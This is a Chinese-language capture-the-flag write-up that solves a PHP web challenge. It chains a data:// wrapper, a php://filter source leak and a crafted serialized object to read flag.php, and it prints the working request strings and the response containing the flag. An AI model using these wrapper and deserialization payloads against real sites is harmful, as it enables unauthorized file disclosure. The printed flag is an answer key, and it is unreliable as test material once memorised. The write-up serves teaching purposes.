## 知识点

* php反序列化
* php伪协议
* include利用php伪协议

## 解题过程

``` php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

先试下

``` http
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

然后用

``` http
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
```

查看useless的代码（base64编码）

``` php
<?php

class Flag{  //flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
?>
```

然后可以让$password等于Flag的序列化。file为flag.php。

## payload

最后的payload

``` http
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

然后页面说很接近了，我差点以为这不对，还好我又用burpsuit的repeater又试了一下。

``` http
HTTP/1.1 200 OK
Server: openresty
Date: Mon, 20 Jan 2020 14:37:46 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 215
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/5.6.40

<br><h1>welcome to the zjctf</h1></br>  
<br>oh u find it </br>

<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag{15a85e3f-197a-4b8f-918b-73cc19e83db3}");
}

?>
<br>U R SO CLOSE !///COME ON PLZ
```

成功获取flag